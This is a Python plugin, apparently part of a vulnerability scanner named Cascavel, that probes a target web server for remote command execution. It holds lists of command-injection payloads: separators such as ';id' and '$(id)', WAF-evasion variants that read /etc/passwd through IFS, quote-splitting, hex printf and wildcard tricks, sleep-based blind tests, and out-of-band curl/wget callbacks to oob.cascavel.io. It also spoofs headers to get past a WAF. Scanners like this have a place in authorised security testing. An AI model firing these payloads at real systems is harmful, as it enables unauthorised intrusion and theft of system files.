# plugins/rce_scanner.py — Cascavel 2026 Intelligence
import time
import urllib.parse

import requests

PARAMS = [
    "cmd",
    "exec",
    "command",
    "run",
    "ping",
    "query",
    "jump",
    "code",
    "reg",
    "do",
    "func",
    "arg",
    "option",
    "load",
    "process",
    "step",
    "read",
    "feature",
    "exe",
    "module",
    "payload",
    "input",
    "ip",
    "host",
    "target",
    "file",
    "path",
    "dir",
    "daemon",
    "upload",
    "log",
    "email",
]

# ──────────── OUTPUT-BASED PAYLOADS ────────────
OUTPUT_PAYLOADS = [
    # Classic separators
    (";id", "uid=", "SEMICOLON_ID"),
    ("|id", "uid=", "PIPE_ID"),
    ("$(id)", "uid=", "DOLLAR_ID"),
    ("`id`", "uid=", "BACKTICK_ID"),
    ("&&id", "uid=", "AND_ID"),
    ("||id", "uid=", "OR_ID"),
    # Windows
    (";dir C:\\", "Volume", "WIN_DIR"),
    ("|type C:\\Windows\\win.ini", "[fonts]", "WIN_INI"),
    ("& ipconfig", "IPv4", "WIN_IPCONFIG"),
    ("& ver", "Microsoft", "WIN_VER"),
    # WAF Bypass 2026 — IFS, quotes, backslash, hex, wildcard
    (";{cat,/etc/passwd}", "root:", "IFS_BYPASS"),
    (";c''at /etc/passwd", "root:", "QUOTE_SPLIT"),
    (";c\\at /etc/passwd", "root:", "BACKSLASH_SPLIT"),
    (";$(printf '\\x63\\x61\\x74') /etc/passwd", "root:", "HEX_PRINTF"),
    (";cat$IFS/etc/passwd", "root:", "IFS_VAR"),
    (";/???/??t /???/p??s??", "root:", "WILDCARD_GLOB"),
    (";cat</etc/passwd", "root:", "INPUT_REDIRECT"),
    # Newline injection
    ("%0aid", "uid=", "NEWLINE_INJECT"),
    ("%0d%0aid", "uid=", "CRLF_INJECT"),
    ("%1acat /etc/passwd", "root:", "SUB_CHAR"),
    # Double encoding
    ("%253Bid", "uid=", "DOUBLE_ENCODE_SEMI"),
    # Tab separator
    ("%09id", "uid=", "TAB_INJECT"),
    # Base64 decode execution
    (";echo aWQ= | base64 -d | sh", "uid=", "BASE64_PIPE"),
    # Bash brace expansion
    (";{echo,test}", "test", "BRACE_EXPANSION"),
    # Environment variable abuse
    (";echo ${PATH}", "/usr", "ENV_PATH_LEAK"),
]

# ──────────── TIME-BASED PAYLOADS ────────────
TIME_PAYLOADS = [
    (";sleep 4", "UNIX_SLEEP", 3.5),
    ("|sleep 4", "PIPE_SLEEP", 3.5),
    ("$(sleep 4)", "DOLLAR_SLEEP", 3.5),
    ("`sleep 4`", "BACKTICK_SLEEP", 3.5),
    (";ping -c 4 127.0.0.1", "PING_4", 3.0),
    ("& timeout /T 4", "WIN_TIMEOUT", 3.5),
    # WAF bypass time
    (";sl''eep 4", "QUOTE_SLEEP", 3.5),
    (";$(printf '\\x73\\x6c\\x65\\x65\\x70') 4", "HEX_SLEEP", 3.5),
    (";/???/sl??p 4", "GLOB_SLEEP", 3.5),
]

# ──────────── OOB (Out-of-Band) PAYLOADS ────────────
OOB_PAYLOADS = [
    (";curl https://oob.cascavel.io/rce", "OOB_CURL"),
    (";wget https://oob.cascavel.io/rce", "OOB_WGET"),
    (";nslookup rce.oob.cascavel.io", "OOB_NSLOOKUP"),
    (";ping -c 1 rce.oob.cascavel.io", "OOB_PING"),
    ("$(curl https://oob.cascavel.io/rce)", "OOB_DOLLAR_CURL"),
]

# Headers para bypass WAF
BYPASS_HEADERS_LIST = [
    {},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"Content-Type": "application/x-www-form-urlencoded"},
]


def _get_baseline_latency(target):
    """Calcula o tempo natural de resposta do servidor."""
    latencies = []
    for _ in range(3):
        try:
            start = time.time()
            requests.get(f"http://{target}/", timeout=8)
            latencies.append(time.time() - start)
        except Exception:
            continue
    if latencies:
        return sum(latencies) / len(latencies)
    return 0.5  # default conservador


def _verify_waf_blind_reflection(target, param):
    """Verifica se o WAF ou a aplicação reflete o payload cegamente, causando Falsos Positivos em testes baseados em string."""  # noqa: E501
    junk = "cascavel_junk_reflection_123"
    url = f"http://{target}/?{param}={junk}"
    try:
        resp = requests.get(url, timeout=5)
        if junk in resp.text:
            return True
    except Exception:
        pass
    return False


def _verify_header_blind_reflection(target):
    """Verifica se headers são refletidos no corpo (para evitar FPs no teste de RCE via Header)."""
    junk = "cascavel_header_junk_123"
    try:
        resp = requests.get(
            f"http://{target}/", headers={"User-Agent": junk, "Referer": junk, "X-Forwarded-For": junk}, timeout=5
        )
        if junk in resp.text:
            return True
    except Exception:
        pass
    return False


def _test_output_rce(target, param, reflects_blindly):
    """Testa RCE output-based com múltiplos separadores e bypass techniques."""
    for payload, indicator, method in OUTPUT_PAYLOADS:
        for headers in BYPASS_HEADERS_LIST[:2]:
            url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
            try:
                resp = requests.get(url, timeout=8, headers={**{"User-Agent": "Cascavel/2.0"}, **headers})
                if indicator and indicator in resp.text:
                    # Se o payload reflete e o payload contem o proprio indicador, ignora
                    if reflects_blindly and indicator in payload:
                        continue

                    return {
                        "tipo": "RCE_OUTPUT",
                        "metodo": method,
                        "parametro": param,
                        "severidade": "CRITICO",
                        "descricao": f"Command execution confirmada via {method}!",
                        "amostra": resp.text[:300],
                        "bypass_header": list(headers.keys())[0] if headers else None,
                    }
            except Exception:
                continue
    return None


def _test_time_rce(target, param, baseline_latency):
    """Testa blind RCE via time delay validando com a baseline natural."""
    if baseline_latency > 8.0:
        return None

    for payload, method, threshold in TIME_PAYLOADS:
        url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
        try:
            start = time.time()
            requests.get(url, timeout=10)
            elapsed = time.time() - start
            if elapsed > (threshold + baseline_latency):
                return {
                    "tipo": "RCE_TIME_BASED",
                    "metodo": method,
                    "parametro": param,
                    "severidade": "CRITICO",
                    "tempo": round(elapsed, 2),
                    "baseline_estimada": round(baseline_latency, 2),
                }
        except requests.Timeout:
            if baseline_latency < 3.0:
                return {
                    "tipo": "RCE_TIME_BASED",
                    "metodo": method,
                    "parametro": param,
                    "severidade": "ALTO",
                    "timeout": True,
                }
        except Exception:
            continue
    return None


def _test_post_rce(target, param, reflects_blindly):
    """Testa RCE via POST body (JSON + form-data)."""
    for payload, indicator, method in OUTPUT_PAYLOADS[:8]:
        for content_type, _data_fn in [
            ("application/json", lambda p, v: None),
            ("application/x-www-form-urlencoded", lambda p, v: None),
        ]:
            try:
                if content_type == "application/json":
                    resp = requests.post(f"http://{target}/", json={param: payload}, timeout=6)
                else:
                    resp = requests.post(f"http://{target}/", data={param: payload}, timeout=6)
                if indicator and indicator in resp.text:
                    # Se o payload reflete e o payload contem o proprio indicador, ignora
                    if reflects_blindly and indicator in payload:
                        continue

                    return {
                        "tipo": "RCE_POST_BODY",
                        "metodo": method,
                        "parametro": param,
                        "severidade": "CRITICO",
                        "content_type": content_type,
                    }
            except Exception:
                continue
    return None


def _test_header_injection(target, header_reflects_blindly):
    """Testa RCE via headers injetáveis (User-Agent, Referer, X-Forwarded-For)."""
    injectable_headers = [
        ("User-Agent", ";id", "uid=", "HEADER_UA"),
        ("Referer", ";id", "uid=", "HEADER_REFERER"),
        ("X-Forwarded-For", "127.0.0.1;id", "uid=", "HEADER_XFF"),
    ]
    for header, payload, indicator, method in injectable_headers:
        try:
            resp = requests.get(f"http://{target}/", headers={header: payload}, timeout=6)
            if indicator in resp.text:
                if header_reflects_blindly and indicator in payload:
                    continue

                return {
                    "tipo": "RCE_HEADER_INJECTION",
                    "metodo": method,
                    "header": header,
                    "severidade": "CRITICO",
                    "descricao": f"RCE via header {header}!",
                }
        except Exception:
            continue
    return None


def _inject_oob(target, param):
    """Injeta payloads OOB para confirmar RCE em cenários blind."""
    injected = []
    for payload, method in OOB_PAYLOADS:
        try:
            requests.get(f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}", timeout=5)
            injected.append({"metodo": method, "payload": payload[:50]})
        except Exception:
            continue
    if injected:
        return {
            "tipo": "RCE_OOB_INJECTED",
            "parametro": param,
            "severidade": "ALTO",
            "descricao": "OOB RCE payloads injetados — verificar DNS/HTTP callback",
            "payloads": injected,
        }
    return None


def run(target, ip, open_ports, banners):
    """
    Scanner RCE 2026-Grade — Output/Time/OOB/Header/POST.

    Técnicas: 25+ separadores (;|$()`&&||\\n%0a%09), WAF bypass
    (IFS, quote split, backslash, hex printf, wildcard glob, input redirect,
    base64 pipe, brace expansion, double encoding, tab/sub char injection),
    time-based (sleep/ping + WAF bypass variants),
    OOB (curl/wget/nslookup/ping callback),
    header injection (User-Agent/Referer/X-Forwarded-For),
    POST body (JSON + form), environment variable leak.
    """
    _ = (ip, open_ports, banners)
    vulns = []

    # Calcular Baseline da infraestrutura alvo
    baseline_latency = _get_baseline_latency(target)
    header_reflects_blindly = _verify_header_blind_reflection(target)

    for param in PARAMS:
        reflects_blindly = _verify_waf_blind_reflection(target, param)

        # 1. Output-based RCE
        vuln = _test_output_rce(target, param, reflects_blindly)
        if vuln:
            vulns.append(vuln)
            continue  # Confirmed RCE, skip other tests for this param

        # 2. Time-based RCE
        vuln = _test_time_rce(target, param, baseline_latency)
        if vuln:
            vulns.append(vuln)
            continue

        # 3. POST body RCE
        vuln = _test_post_rce(target, param, reflects_blindly)
        if vuln:
            vulns.append(vuln)
            continue

        # 4. OOB injection (always inject for top params)
        if param in ["cmd", "exec", "command", "run", "ip", "host"]:
            vuln = _inject_oob(target, param)
            if vuln:
                vulns.append(vuln)

    # 5. Header injection (global, not per-param)
    header_vuln = _test_header_injection(target, header_reflects_blindly)
    if header_vuln:
        vulns.append(header_vuln)

    return {
        "plugin": "rce_scanner",
        "versao": "2026.1",
        "tecnicas": [
            "output_based",
            "time_based",
            "oob_callback",
            "header_injection",
            "post_body",
            "waf_bypass",
            "wildcard_glob",
            "base64_pipe",
        ],
        "resultados": vulns if vulns else "Nenhum RCE detectado",
    }
